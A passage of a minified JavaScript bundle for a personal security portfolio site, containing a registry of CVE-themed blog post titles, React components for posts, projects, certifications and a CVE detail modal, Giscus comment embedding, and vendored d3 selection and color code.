</html>
`,bv={firmware_llm_annotator:{title:"Firmware Exploration: LLM as Your Annotator",slug:"firmware_llm_annotator",content:fv},transient_scheduler_attacks_tsa_blog:{title:"Transient Scheduler Attacks on CPUs: Exploiting AMD’s New Microarchitectural Leak",slug:"transient_scheduler_attacks_tsa_blog",content:yv},kernel_surface_audit_blog:{title:"Who Can Touch Your Kernel? Auditing /boot/vmlinuz-* on Linux",slug:"kernel_surface_audit_blog",content:kv},"cve-2022-26318-re-blog":{title:"Reverse-Engineering CVE-2022-26318 (WatchGuard Firebox/XTM): From Network Trace to Root Cause (Non-Weaponized)",slug:"cve-2022-26318-re-blog",content:xv},"react2shell-toy-lab":{title:'From React2Shell to Toy Labs: Understanding Insecure Deserialization with a Tiny "Fake Flight" Server',slug:"react2shell-toy-lab",content:wv},1001:{title:"CVE-2024–1001",slug:"1001",content:cv},"0012":{title:"CVE-2024–0012",slug:"0012",content:lv},40982:{title:"CVE-2022–40982",slug:"40982",content:dv},cow:{title:"CVE-2016–5195",slug:"cow",content:hv},symlinks:{title:"Symbolic Links (Symlinks) in Linux",slug:"symlinks",content:vv},23397:{title:"CVE-2023–23397",slug:"23397",content:pv},"0160":{title:"CVE-2014-0160",slug:"0160",content:ov},11882:{title:"CVE-2017-11882",slug:"11882",content:uv},robot:{title:"ROBOT (Return of Bleichenbacher’s Oracle Threat) Attack",slug:"robot",content:gv},poodle:{title:"ZOMBIE POODLE and GOLDENDOODLE ATTACKS",slug:"poodle",content:mv}};function _v(e){try{const t=new DOMParser().parseFromString(e,"text/html"),s=["style","script","link","nav","header","footer",".navbar",".nav-container",".theme-toggle",".footer",".social-links",".social-icons"];t.querySelectorAll(s.join(",")).forEach(l=>l.remove()),t.querySelectorAll("[style]").forEach(l=>l.removeAttribute("style"));const r=t.querySelector("h1");r&&r.remove();const i=[".blog-text","article",".blog-post-content","main"];let a=t.body;for(const l of i){const o=t.querySelector(l);if(o){a=o;break}}return a.querySelectorAll(".container").forEach(l=>{for(;l.firstChild;)l.parentNode.insertBefore(l.firstChild,l);l.remove()}),Array.from(a.querySelectorAll("h2, h3")).forEach((l,o)=>{l.id||(l.id=`section-${o+1}`)}),a.innerHTML||e}catch{return e}}function Sv(){const{slug:e}=mg(),n=bv[e],t=al.find(i=>i.slug===e),s=S.useMemo(()=>n?_v(n.content):"",[n]),r=()=>document.body.classList.contains("dark")?"dark":"light";return S.useEffect(()=>{const i=document.querySelector(".giscus-container");if(!i)return;i.innerHTML="";const a=document.createElement("script");return a.src="https://giscus.app/client.js",a.async=!0,a.crossOrigin="anonymous",a.setAttribute("data-giscus","true"),a.setAttribute("data-repo","Hem1700/hem1700.github.io"),a.setAttribute("data-repo-id","R_kgDONilgZg"),a.setAttribute("data-category","General"),a.setAttribute("data-category-id","DIC_kwDONilgZs4CzSR2"),a.setAttribute("data-mapping","pathname"),a.setAttribute("data-strict","1"),a.setAttribute("data-reactions-enabled","1"),a.setAttribute("data-emit-metadata","0"),a.setAttribute("data-input-position","top"),a.setAttribute("data-lang","en"),a.setAttribute("data-theme",r()),i.appendChild(a),()=>{i.innerHTML=""}},[e]),S.useEffect(()=>{const i=()=>{var o;const l=document.querySelector("iframe.giscus-frame");l&&((o=l.contentWindow)==null||o.postMessage({giscus:{setConfig:{theme:r()}}},"https://giscus.app"))},a=new MutationObserver(i);return a.observe(document.body,{attributes:!0,attributeFilter:["class"]}),i(),()=>a.disconnect()},[]),n?d.jsxs(d.Fragment,{children:[d.jsx("header",{className:"blog-post-header",children:d.jsxs("div",{className:"container text-center",children:[d.jsx("h1",{className:"blog-post-title",children:n.title}),t&&d.jsxs("p",{className:"blog-post-date",children:[t.date," · ",t.readTime]})]})}),d.jsxs("main",{className:"blog-post-content container",children:[d.jsx("article",{dangerouslySetInnerHTML:{__html:s}}),d.jsx("section",{className:"comments",children:d.jsx("div",{className:"container",children:d.jsx("div",{className:"giscus-container"})})})]})]}):d.jsxs("main",{className:"blog-post-content container",children:[d.jsx("h2",{children:"Post not found"}),d.jsx("p",{children:"Signal lost. Let’s go back."}),d.jsx(Xe,{to:"/blogs",className:"view-credentials",children:"Back to Blog"})]})}const Ev=["All","Security Tools","Research","Web","Desktop","Cloud","Automation"];function Tv({activeFilter:e,onFilterChange:n}){return d.jsx("div",{className:"filter-chips",children:Ev.map(t=>d.jsx("button",{className:`chip ${t===e?"active":""}`,type:"button",onClick:()=>n(t),children:t},t))})}function Cv({items:e}){const[n,t]=S.useState(0);if(!(e!=null&&e.length))return null;const s=e[n],r=()=>t(a=>(a+1)%e.length),i=()=>t(a=>(a-1+e.length)%e.length);return d.jsxs("div",{className:"featured-carousel",children:[d.jsxs("div",{className:"featured-card",children:[d.jsxs("div",{className:"featured-meta",children:[d.jsx("span",{className:"pill",children:"Featured"}),s.tag&&d.jsx("span",{className:"pill",children:s.tag})]}),d.jsx("h3",{children:s.title}),d.jsx("p",{children:s.description}),d.jsx("div",{className:"project-tags",children:(s.tags||[]).map(a=>d.jsx("span",{className:"pill",children:a},a))}),d.jsx("div",{className:"featured-actions",children:d.jsx("a",{href:s.href,target:"_blank",rel:"noreferrer",className:"link-button",children:"View"})})]}),e.length>1&&d.jsxs("div",{className:"featured-controls",children:[d.jsx("button",{type:"button",onClick:i,className:"button ghost",children:"←"}),d.jsx("button",{type:"button",onClick:r,className:"button ghost",children:"→"})]})]})}function Nv({items:e,showViewAll:n=!1,showHeader:t=!0}){const[s,r]=S.useState("All"),[i,a]=S.useState(1),l=4,o=e.slice(0,2),c=S.useMemo(()=>s==="All"?e:e.filter(g=>{var k;return(k=g.tags)==null?void 0:k.some(y=>y.toLowerCase().includes(s.toLowerCase().split(" ")[0]))}),[s,e]),u=Math.max(1,Math.ceil(c.length/l)),m=c.slice((i-1)*l,i*l),h=g=>{r(g),a(1)};return d.jsx("section",{className:"projects",id:"projects",children:d.jsxs("div",{className:"container",children:[t&&d.jsxs("div",{className:"section-header",children:[d.jsxs("div",{children:[d.jsx("h2",{className:"section-title",children:"Projects"}),d.jsx("p",{className:"section-subtitle",children:"Deployment dossier — hardened builds and offensive prototypes."})]}),n&&d.jsx("div",{className:"section-actions",children:d.jsx(Xe,{className:"link-button",to:"/projects",children:"View all projects"})})]}),t&&d.jsx(Tv,{activeFilter:s,onFilterChange:h}),t&&d.jsx(Cv,{items:o}),d.jsx("div",{className:"projects-list",children:m.map(g=>{var k;return d.jsxs("div",{className:"project-row",children:[d.jsxs("div",{className:"project-row-body",children:[d.jsx("a",{href:g.href,target:"_blank",rel:"noreferrer",className:"project-title-link",children:d.jsx("h5",{className:"project-title",children:g.title})}),d.jsx("p",{className:"project-description",children:g.description}),(k=g.tags)!=null&&k.length?d.jsx("div",{className:"project-tags",children:g.tags.map(y=>d.jsx("span",{className:"pill",children:y},y))}):null]}),d.jsx("div",{className:"project-row-cta",children:d.jsx("a",{href:g.href,target:"_blank",rel:"noreferrer",className:"view-credentials",children:"View"})})]},g.title)})}),u>1&&d.jsxs("div",{className:"blog-pagination project-pagination",children:[d.jsx("button",{className:"pill",disabled:i===1,onClick:()=>a(Math.max(1,i-1)),children:"Previous"}),d.jsxs("span",{className:"blog-page-indicator",children:["Page ",i," of ",u]}),d.jsx("button",{className:"pill",disabled:i===u,onClick:()=>a(Math.min(u,i+1)),children:"Next"})]})]})})}function Av(){return d.jsx("div",{className:"hud-workspace",children:d.jsxs(Mt,{title:"Projects // Deployables",subtitle:"drag / resize",initialSize:{width:1180},children:[d.jsx("header",{className:"blog-welcome-section",children:d.jsxs("div",{className:"container text-center",children:[d.jsx("h1",{children:"Projects"}),d.jsx("p",{className:"blog-subtitle",children:"Deployments, exploit prototypes, and research drops."})]})}),d.jsx(Nv,{items:ev,showHeader:!1})]})})}function Pv({issuer:e="Cert"}){var t;const n=((t=e==null?void 0:e[0])==null?void 0:t.toUpperCase())||"C";return d.jsx("div",{className:"cert-badge",children:n})}const Lv=["All","Security","Cloud","Networking"];function Rv({items:e,showViewAll:n=!1,showHeader:t=!0}){const[s,r]=S.useState("All"),[i,a]=S.useState(1),l=5,o=S.useMemo(()=>s==="All"?e:e.filter(h=>h.domain?h.domain===s:!0),[s,e]),c=Math.max(1,Math.ceil(o.length/l)),u=o.slice((i-1)*l,i*l),m=h=>{r(h),a(1)};return d.jsx("section",{className:"certifications",id:"certs",children:d.jsxs("div",{className:"container",children:[t&&d.jsxs("div",{className:"section-header",children:[d.jsx("div",{children:d.jsx("h2",{children:"CERTIFICATIONS"})}),n&&d.jsx("div",{className:"section-actions",children:d.jsx(Xe,{className:"link-button",to:"/certifications",children:"View all certifications"})})]}),t&&d.jsx("div",{className:"filter-chips",children:Lv.map(h=>d.jsx("button",{className:`chip ${h===s?"active":""}`,type:"button",onClick:()=>m(h),children:h},h))}),d.jsx("div",{className:"cert-list",children:u.map(h=>d.jsxs("div",{className:"cert-row",children:[d.jsxs("div",{className:"cert-row-meta",children:[d.jsx("div",{className:"cert-row-badge",children:d.jsx(Pv,{issuer:h.issuer})}),d.jsxs("div",{className:"cert-row-tags",children:[d.jsx("span",{className:"pill",children:h.domain}),d.jsx("span",{className:"pill",children:h.issuer})]})]}),d.jsxs("div",{className:"cert-row-body",children:[d.jsx("div",{className:"cert-row-title",children:h.title}),d.jsx("p",{className:"cert-row-details",children:h.details})]}),d.jsx("div",{className:"cert-row-cta",children:d.jsx("a",{href:h.href,className:"view-credentials",target:"_blank",rel:"noreferrer",children:"View"})})]},h.title))}),c>1&&d.jsxs("div",{className:"blog-pagination project-pagination",children:[d.jsx("button",{className:"pill",disabled:i===1,onClick:()=>a(Math.max(1,i-1)),children:"Previous"}),d.jsxs("span",{className:"blog-page-indicator",children:["Page ",i," of ",c]}),d.jsx("button",{className:"pill",disabled:i===c,onClick:()=>a(Math.min(c,i+1)),children:"Next"})]})]})})}function Ov(){return d.jsx("div",{className:"hud-workspace",children:d.jsxs(Mt,{title:"Credentials",subtitle:"drag / resize",initialSize:{width:1180},children:[d.jsx("header",{className:"blog-welcome-section",children:d.jsxs("div",{className:"container text-center",children:[d.jsx("h1",{children:"Certifications"}),d.jsx("p",{className:"blog-subtitle",children:"Credentials earned; operators verified."})]})}),d.jsx(Rv,{items:nv,showHeader:!1})]})})}function Mv({cve:e,onClose:n}){var t;return d.jsxs("div",{className:`cve-modal ${e?"open":""}`,"aria-label":"CVE details",children:[d.jsx("div",{className:"cve-modal__backdrop",onClick:n}),d.jsxs("div",{className:"cve-modal__card",children:[d.jsxs("div",{className:"cve-drawer__header",children:[d.jsxs("div",{children:[d.jsx("p",{className:"pill",children:"CVE Detail"}),d.jsx("h3",{children:(e==null?void 0:e.id)||"Select a CVE"})]}),d.jsx("button",{className:"button ghost",type:"button",onClick:n,children:"Close"})]}),e?d.jsxs("div",{className:"cve-drawer__body",children:[d.jsx("p",{className:"cve-title",children:e.title}),d.jsxs("div",{className:"cve-meta",children:[d.jsxs("span",{className:"pill",children:["Severity: ",e.severity]}),d.jsxs("span",{className:"pill",children:["CVSS: ",e.cvss]}),d.jsx("span",{className:`pill ${e.kev?"kev":""}`,children:e.kev?"KEV":"Not KEV"}),d.jsxs("span",{className:"pill",children:["Year: ",e.year]})]}),d.jsx("p",{children:e.summary}),e.metrics?d.jsxs("div",{className:"cve-meta extra",children:[d.jsxs("span",{className:"pill",children:["Total in cluster: ",e.metrics.total||"–"]}),d.jsxs("span",{className:"pill",children:["Latest: ",e.metrics.latestYear||"–"]}),d.jsxs("span",{className:"pill",children:["Max CVSS: ",e.metrics.maxCvss||"–"]})]}):null,(t=e.references)!=null&&t.length?d.jsxs("div",{className:"cve-links",children:[d.jsx("h4",{children:"References"}),d.jsx("ul",{children:e.references.map(s=>d.jsx("li",{children:d.jsx("a",{href:s,target:"_blank",rel:"noreferrer",children:s})},s))})]}):null]}):d.jsx("p",{className:"text-muted",children:"Click a CVE node to see details."})]})]})}var jv={value:()=>{}};function Pi(){for(var e=0,n=arguments.length,t={},s;e<n;++e){if(!(s=arguments[e]+"")||s in t||/[\s.]/.test(s))throw new Error("illegal type: "+s);t[s]=[]}return new Lr(t)}function Lr(e){this._=e}function Iv(e,n){return e.trim().split(/^|\s+/).map(function(t){var s="",r=t.indexOf(".");if(r>=0&&(s=t.slice(r+1),t=t.slice(0,r)),t&&!n.hasOwnProperty(t))throw new Error("unknown type: "+t);return{type:t,name:s}})}Lr.prototype=Pi.prototype={constructor:Lr,on:function(e,n){var t=this._,s=Iv(e+"",t),r,i=-1,a=s.length;if(arguments.length<2){for(;++i<a;)if((r=(e=s[i]).type)&&(r=zv(t[r],e.name)))return r;return}if(n!=null&&typeof n!="function")throw new Error("invalid callback: "+n);for(;++i<a;)if(r=(e=s[i]).type)t[r]=Hc(t[r],e.name,n);else if(n==null)for(r in t)t[r]=Hc(t[r],e.name,null);return this},copy:function(){var e={},n=this._;for(var t in n)e[t]=n[t].slice();return new Lr(e)},call:function(e,n){if((r=arguments.length-2)>0)for(var t=new Array(r),s=0,r,i;s<r;++s)t[s]=arguments[s+2];if(!this._.hasOwnProperty(e))throw new Error("unknown type: "+e);for(i=this._[e],s=0,r=i.length;s<r;++s)i[s].value.apply(n,t)},apply:function(e,n,t){if(!this._.hasOwnProperty(e))throw new Error("unknown type: "+e);for(var s=this._[e],r=0,i=s.length;r<i;++r)s[r].value.apply(n,t)}};function zv(e,n){for(var t=0,s=e.length,r;t<s;++t)if((r=e[t]).name===n)return r.value}function Hc(e,n,t){for(var s=0,r=e.length;s<r;++s)if(e[s].name===n){e[s]=jv,e=e.slice(0,s).concat(e.slice(s+1));break}return t!=null&&e.push({name:n,value:t}),e}var ll="http://www.w3.org/1999/xhtml";const Wc={svg:"http://www.w3.org/2000/svg",xhtml:ll,xlink:"http://www.w3.org/1999/xlink",xml:"http://www.w3.org/XML/1998/namespace",xmlns:"http://www.w3.org/2000/xmlns/"};function Li(e){var n=e+="",t=n.indexOf(":");return t>=0&&(n=e.slice(0,t))!=="xmlns"&&(e=e.slice(t+1)),Wc.hasOwnProperty(n)?{space:Wc[n],local:e}:e}function Dv(e){return function(){var n=this.ownerDocument,t=this.namespaceURI;return t===ll&&n.documentElement.namespaceURI===ll?n.createElement(e):n.createElementNS(t,e)}}function Bv(e){return function(){return this.ownerDocument.createElementNS(e.space,e.local)}}function zd(e){var n=Li(e);return(n.local?Bv:Dv)(n)}function Fv(){}function fo(e){return e==null?Fv:function(){return this.querySelector(e)}}function Uv(e){typeof e!="function"&&(e=fo(e));for(var n=this._groups,t=n.length,s=new Array(t),r=0;r<t;++r)for(var i=n[r],a=i.length,l=s[r]=new Array(a),o,c,u=0;u<a;++u)(o=i[u])&&(c=e.call(o,o.__data__,u,i))&&("__data__"in o&&(c.__data__=o.__data__),l[u]=c);return new je(s,this._parents)}function Vv(e){return e==null?[]:Array.isArray(e)?e:Array.from(e)}function Hv(){return[]}function Dd(e){return e==null?Hv:function(){return this.querySelectorAll(e)}}function Wv(e){return function(){return Vv(e.apply(this,arguments))}}function $v(e){typeof e=="function"?e=Wv(e):e=Dd(e);for(var n=this._groups,t=n.length,s=[],r=[],i=0;i<t;++i)for(var a=n[i],l=a.length,o,c=0;c<l;++c)(o=a[c])&&(s.push(e.call(o,o.__data__,c,a)),r.push(o));return new je(s,r)}function Bd(e){return function(){return this.matches(e)}}function Fd(e){return function(n){return n.matches(e)}}var Gv=Array.prototype.find;function Yv(e){return function(){return Gv.call(this.children,e)}}function qv(){return this.firstElementChild}function Xv(e){return this.select(e==null?qv:Yv(typeof e=="function"?e:Fd(e)))}var Kv=Array.prototype.filter;function Qv(){return Array.from(this.children)}function Zv(e){return function(){return Kv.call(this.children,e)}}function Jv(e){return this.selectAll(e==null?Qv:Zv(typeof e=="function"?e:Fd(e)))}function ey(e){typeof e!="function"&&(e=Bd(e));for(var n=this._groups,t=n.length,s=new Array(t),r=0;r<t;++r)for(var i=n[r],a=i.length,l=s[r]=[],o,c=0;c<a;++c)(o=i[c])&&e.call(o,o.__data__,c,i)&&l.push(o);return new je(s,this._parents)}function Ud(e){return new Array(e.length)}function ny(){return new je(this._enter||this._groups.map(Ud),this._parents)}function ai(e,n){this.ownerDocument=e.ownerDocument,this.namespaceURI=e.namespaceURI,this._next=null,this._parent=e,this.__data__=n}ai.prototype={constructor:ai,appendChild:function(e){return this._parent.insertBefore(e,this._next)},insertBefore:function(e,n){return this._parent.insertBefore(e,n)},querySelector:function(e){return this._parent.querySelector(e)},querySelectorAll:function(e){return this._parent.querySelectorAll(e)}};function ty(e){return function(){return e}}function sy(e,n,t,s,r,i){for(var a=0,l,o=n.length,c=i.length;a<c;++a)(l=n[a])?(l.__data__=i[a],s[a]=l):t[a]=new ai(e,i[a]);for(;a<o;++a)(l=n[a])&&(r[a]=l)}function ry(e,n,t,s,r,i,a){var l,o,c=new Map,u=n.length,m=i.length,h=new Array(u),g;for(l=0;l<u;++l)(o=n[l])&&(h[l]=g=a.call(o,o.__data__,l,n)+"",c.has(g)?r[l]=o:c.set(g,o));for(l=0;l<m;++l)g=a.call(e,i[l],l,i)+"",(o=c.get(g))?(s[l]=o,o.__data__=i[l],c.delete(g)):t[l]=new ai(e,i[l]);for(l=0;l<u;++l)(o=n[l])&&c.get(h[l])===o&&(r[l]=o)}function iy(e){return e.__data__}function ay(e,n){if(!arguments.length)return Array.from(this,iy);var t=n?ry:sy,s=this._parents,r=this._groups;typeof e!="function"&&(e=ty(e));for(var i=r.length,a=new Array(i),l=new Array(i),o=new Array(i),c=0;c<i;++c){var u=s[c],m=r[c],h=m.length,g=ly(e.call(u,u&&u.__data__,c,s)),k=g.length,y=l[c]=new Array(k),x=a[c]=new Array(k),p=o[c]=new Array(h);t(u,m,y,x,p,g,n);for(var f=0,v=0,w,_;f<k;++f)if(w=y[f]){for(f>=v&&(v=f+1);!(_=x[v])&&++v<k;);w._next=_||null}}return a=new je(a,s),a._enter=l,a._exit=o,a}function ly(e){return typeof e=="object"&&"length"in e?e:Array.from(e)}function oy(){return new je(this._exit||this._groups.map(Ud),this._parents)}function cy(e,n,t){var s=this.enter(),r=this,i=this.exit();return typeof e=="function"?(s=e(s),s&&(s=s.selection())):s=s.append(e+""),n!=null&&(r=n(r),r&&(r=r.selection())),t==null?i.remove():t(i),s&&r?s.merge(r).order():r}function uy(e){for(var n=e.selection?e.selection():e,t=this._groups,s=n._groups,r=t.length,i=s.length,a=Math.min(r,i),l=new Array(r),o=0;o<a;++o)for(var c=t[o],u=s[o],m=c.length,h=l[o]=new Array(m),g,k=0;k<m;++k)(g=c[k]||u[k])&&(h[k]=g);for(;o<r;++o)l[o]=t[o];return new je(l,this._parents)}function py(){for(var e=this._groups,n=-1,t=e.length;++n<t;)for(var s=e[n],r=s.length-1,i=s[r],a;--r>=0;)(a=s[r])&&(i&&a.compareDocumentPosition(i)^4&&i.parentNode.insertBefore(a,i),i=a);return this}function dy(e){e||(e=hy);function n(m,h){return m&&h?e(m.__data__,h.__data__):!m-!h}for(var t=this._groups,s=t.length,r=new Array(s),i=0;i<s;++i){for(var a=t[i],l=a.length,o=r[i]=new Array(l),c,u=0;u<l;++u)(c=a[u])&&(o[u]=c);o.sort(n)}return new je(r,this._parents).order()}function hy(e,n){return e<n?-1:e>n?1:e>=n?0:NaN}function fy(){var e=arguments[0];return arguments[0]=this,e.apply(null,arguments),this}function my(){return Array.from(this)}function gy(){for(var e=this._groups,n=0,t=e.length;n<t;++n)for(var s=e[n],r=0,i=s.length;r<i;++r){var a=s[r];if(a)return a}return null}function vy(){let e=0;for(const n of this)++e;return e}function yy(){return!this.node()}function wy(e){for(var n=this._groups,t=0,s=n.length;t<s;++t)for(var r=n[t],i=0,a=r.length,l;i<a;++i)(l=r[i])&&e.call(l,l.__data__,i,r);return this}function ky(e){return function(){this.removeAttribute(e)}}function xy(e){return function(){this.removeAttributeNS(e.space,e.local)}}function by(e,n){return function(){this.setAttribute(e,n)}}function _y(e,n){return function(){this.setAttributeNS(e.space,e.local,n)}}function Sy(e,n){return function(){var t=n.apply(this,arguments);t==null?this.removeAttribute(e):this.setAttribute(e,t)}}function Ey(e,n){return function(){var t=n.apply(this,arguments);t==null?this.removeAttributeNS(e.space,e.local):this.setAttributeNS(e.space,e.local,t)}}function Ty(e,n){var t=Li(e);if(arguments.length<2){var s=this.node();return t.local?s.getAttributeNS(t.space,t.local):s.getAttribute(t)}return this.each((n==null?t.local?xy:ky:typeof n=="function"?t.local?Ey:Sy:t.local?_y:by)(t,n))}function Vd(e){return e.ownerDocument&&e.ownerDocument.defaultView||e.document&&e||e.defaultView}function Cy(e){return function(){this.style.removeProperty(e)}}function Ny(e,n,t){return function(){this.style.setProperty(e,n,t)}}function Ay(e,n,t){return function(){var s=n.apply(this,arguments);s==null?this.style.removeProperty(e):this.style.setProperty(e,s,t)}}function Py(e,n,t){return arguments.length>1?this.each((n==null?Cy:typeof n=="function"?Ay:Ny)(e,n,t??"")):Ht(this.node(),e)}function Ht(e,n){return e.style.getPropertyValue(n)||Vd(e).getComputedStyle(e,null).getPropertyValue(n)}function Ly(e){return function(){delete this[e]}}function Ry(e,n){return function(){this[e]=n}}function Oy(e,n){return function(){var t=n.apply(this,arguments);t==null?delete this[e]:this[e]=t}}function My(e,n){return arguments.length>1?this.each((n==null?Ly:typeof n=="function"?Oy:Ry)(e,n)):this.node()[e]}function Hd(e){return e.trim().split(/^|\s+/)}function mo(e){return e.classList||new Wd(e)}function Wd(e){this._node=e,this._names=Hd(e.getAttribute("class")||"")}Wd.prototype={add:function(e){var n=this._names.indexOf(e);n<0&&(this._names.push(e),this._node.setAttribute("class",this._names.join(" ")))},remove:function(e){var n=this._names.indexOf(e);n>=0&&(this._names.splice(n,1),this._node.setAttribute("class",this._names.join(" ")))},contains:function(e){return this._names.indexOf(e)>=0}};function $d(e,n){for(var t=mo(e),s=-1,r=n.length;++s<r;)t.add(n[s])}function Gd(e,n){for(var t=mo(e),s=-1,r=n.length;++s<r;)t.remove(n[s])}function jy(e){return function(){$d(this,e)}}function Iy(e){return function(){Gd(this,e)}}function zy(e,n){return function(){(n.apply(this,arguments)?$d:Gd)(this,e)}}function Dy(e,n){var t=Hd(e+"");if(arguments.length<2){for(var s=mo(this.node()),r=-1,i=t.length;++r<i;)if(!s.contains(t[r]))return!1;return!0}return this.each((typeof n=="function"?zy:n?jy:Iy)(t,n))}function By(){this.textContent=""}function Fy(e){return function(){this.textContent=e}}function Uy(e){return function(){var n=e.apply(this,arguments);this.textContent=n??""}}function Vy(e){return arguments.length?this.each(e==null?By:(typeof e=="function"?Uy:Fy)(e)):this.node().textContent}function Hy(){this.innerHTML=""}function Wy(e){return function(){this.innerHTML=e}}function $y(e){return function(){var n=e.apply(this,arguments);this.innerHTML=n??""}}function Gy(e){return arguments.length?this.each(e==null?Hy:(typeof e=="function"?$y:Wy)(e)):this.node().innerHTML}function Yy(){this.nextSibling&&this.parentNode.appendChild(this)}function qy(){return this.each(Yy)}function Xy(){this.previousSibling&&this.parentNode.insertBefore(this,this.parentNode.firstChild)}function Ky(){return this.each(Xy)}function Qy(e){var n=typeof e=="function"?e:zd(e);return this.select(function(){return this.appendChild(n.apply(this,arguments))})}function Zy(){return null}function Jy(e,n){var t=typeof e=="function"?e:zd(e),s=n==null?Zy:typeof n=="function"?n:fo(n);return this.select(function(){return this.insertBefore(t.apply(this,arguments),s.apply(this,arguments)||null)})}function e0(){var e=this.parentNode;e&&e.removeChild(this)}function n0(){return this.each(e0)}function t0(){var e=this.cloneNode(!1),n=this.parentNode;return n?n.insertBefore(e,this.nextSibling):e}function s0(){var e=this.cloneNode(!0),n=this.parentNode;return n?n.insertBefore(e,this.nextSibling):e}function r0(e){return this.select(e?s0:t0)}function i0(e){return arguments.length?this.property("__data__",e):this.node().__data__}function a0(e){return function(n){e.call(this,n,this.__data__)}}function l0(e){return e.trim().split(/^|\s+/).map(function(n){var t="",s=n.indexOf(".");return s>=0&&(t=n.slice(s+1),n=n.slice(0,s)),{type:n,name:t}})}function o0(e){return function(){var n=this.__on;if(n){for(var t=0,s=-1,r=n.length,i;t<r;++t)i=n[t],(!e.type||i.type===e.type)&&i.name===e.name?this.removeEventListener(i.type,i.listener,i.options):n[++s]=i;++s?n.length=s:delete this.__on}}}function c0(e,n,t){return function(){var s=this.__on,r,i=a0(n);if(s){for(var a=0,l=s.length;a<l;++a)if((r=s[a]).type===e.type&&r.name===e.name){this.removeEventListener(r.type,r.listener,r.options),this.addEventListener(r.type,r.listener=i,r.options=t),r.value=n;return}}this.addEventListener(e.type,i,t),r={type:e.type,name:e.name,value:n,listener:i,options:t},s?s.push(r):this.__on=[r]}}function u0(e,n,t){var s=l0(e+""),r,i=s.length,a;if(arguments.length<2){var l=this.node().__on;if(l){for(var o=0,c=l.length,u;o<c;++o)for(r=0,u=l[o];r<i;++r)if((a=s[r]).type===u.type&&a.name===u.name)return u.value}return}for(l=n?c0:o0,r=0;r<i;++r)this.each(l(s[r],n,t));return this}function Yd(e,n,t){var s=Vd(e),r=s.CustomEvent;typeof r=="function"?r=new r(n,t):(r=s.document.createEvent("Event"),t?(r.initEvent(n,t.bubbles,t.cancelable),r.detail=t.detail):r.initEvent(n,!1,!1)),e.dispatchEvent(r)}function p0(e,n){return function(){return Yd(this,e,n)}}function d0(e,n){return function(){return Yd(this,e,n.apply(this,arguments))}}function h0(e,n){return this.each((typeof n=="function"?d0:p0)(e,n))}function*f0(){for(var e=this._groups,n=0,t=e.length;n<t;++n)for(var s=e[n],r=0,i=s.length,a;r<i;++r)(a=s[r])&&(yield a)}var qd=[null];function je(e,n){this._groups=e,this._parents=n}function Ks(){return new je([[document.documentElement]],qd)}function m0(){return this}je.prototype=Ks.prototype={constructor:je,select:Uv,selectAll:$v,selectChild:Xv,selectChildren:Jv,filter:ey,data:ay,enter:ny,exit:oy,join:cy,merge:uy,selection:m0,order:py,sort:dy,call:fy,nodes:my,node:gy,size:vy,empty:yy,each:wy,attr:Ty,style:Py,property:My,classed:Dy,text:Vy,html:Gy,raise:qy,lower:Ky,append:Qy,insert:Jy,remove:n0,clone:r0,datum:i0,on:u0,dispatch:h0,[Symbol.iterator]:f0};function dn(e){return typeof e=="string"?new je([[document.querySelector(e)]],[document.documentElement]):new je([[e]],qd)}function g0(e){let n;for(;n=e.sourceEvent;)e=n;return e}function Xn(e,n){if(e=g0(e),n===void 0&&(n=e.currentTarget),n){var t=n.ownerSVGElement||n;if(t.createSVGPoint){var s=t.createSVGPoint();return s.x=e.clientX,s.y=e.clientY,s=s.matrixTransform(n.getScreenCTM().inverse()),[s.x,s.y]}if(n.getBoundingClientRect){var r=n.getBoundingClientRect();return[e.clientX-r.left-n.clientLeft,e.clientY-r.top-n.clientTop]}}return[e.pageX,e.pageY]}const ol={capture:!0,passive:!1};function cl(e){e.preventDefault(),e.stopImmediatePropagation()}function v0(e){var n=e.document.documentElement,t=dn(e).on("dragstart.drag",cl,ol);"onselectstart"in n?t.on("selectstart.drag",cl,ol):(n.__noselect=n.style.MozUserSelect,n.style.MozUserSelect="none")}function y0(e,n){var t=e.document.documentElement,s=dn(e).on("dragstart.drag",null);n&&(s.on("click.drag",cl,ol),setTimeout(function(){s.on("click.drag",null)},0)),"onselectstart"in t?s.on("selectstart.drag",null):(t.style.MozUserSelect=t.__noselect,delete t.__noselect)}function go(e,n,t){e.prototype=n.prototype=t,t.constructor=e}function Xd(e,n){var t=Object.create(e.prototype);for(var s in n)t[s]=n[s];return t}function Qs(){}var Bs=.7,li=1/Bs,jt="\\s*([+-]?\\d+)\\s*",Fs="\\s*([+-]?(?:\\d*\\.)?\\d+(?:[eE][+-]?\\d+)?)\\s*",an="\\s*([+-]?(?:\\d*\\.)?\\d+(?:[eE][+-]?\\d+)?)%\\s*",w0=/^#([0-9a-f]{3,8})$/,k0=new RegExp(`^rgb\\(${jt},${jt},${jt}\\)$`),x0=new RegExp(`^rgb\\(${an},${an},${an}\\)$`),b0=new RegExp(`^rgba\\(${jt},${jt},${jt},${Fs}\\)$`),_0=new RegExp(`^rgba\\(${an},${an},${an},${Fs}\\)$`),S0=new RegExp(`^hsl\\(${Fs},${an},${an}\\)$`),E0=new RegExp(`^hsla\\(${Fs},${an},${an},${Fs}\\)$`),$c={aliceblue:15792383,antiquewhite:16444375,aqua:65535,aquamarine:8388564,azure:15794175,beige:16119260,bisque:16770244,black:0,blanchedalmond:16772045,blue:255,blueviolet:9055202,brown:10824234,burlywood:14596231,cadetblue:6266528,chartreuse:8388352,chocolate:13789470,coral:16744272,cornflowerblue:6591981,cornsilk:16775388,crimson:14423100,cyan:65535,darkblue:139,darkcyan:35723,darkgoldenrod:12092939,darkgray:11119017,darkgreen:25600,darkgrey:11119017,darkkhaki:12433259,darkmagenta:9109643,darkolivegreen:5597999,darkorange:16747520,darkorchid:10040012,darkred:9109504,darksalmon:15308410,darkseagreen:9419919,darkslateblue:4734347,darkslategray:3100495,darkslategrey:3100495,darkturquoise:52945,darkviolet:9699539,deeppink:16716947,deepskyblue:49151,dimgray:6908265,dimgrey:6908265,dodgerblue:2003199,firebrick:11674146,floralwhite:16775920,forestgreen:2263842,fuchsia:16711935,gainsboro:14474460,ghostwhite:16316671,gold:16766720,goldenrod:14329120,gray:8421504,green:32768,greenyellow:11403055,grey:8421504,honeydew:15794160,hotpink:16738740,indianred:13458524,indigo:4915330,ivory:16777200,khaki:15787660,lavender:15132410,lavenderblush:16773365,lawngreen:8190976,lemonchiffon:16775885,lightblue:11393254,lightcoral:15761536,lightcyan:14745599,lightgoldenrodyellow:16448210,lightgray:13882323,lightgreen:9498256,lightgrey:13882323,lightpink:16758465,lightsalmon:16752762,lightseagreen:2142890,lightskyblue:8900346,lightslategray:7833753,lightslategrey:7833753,lightsteelblue:11584734,lightyellow:167771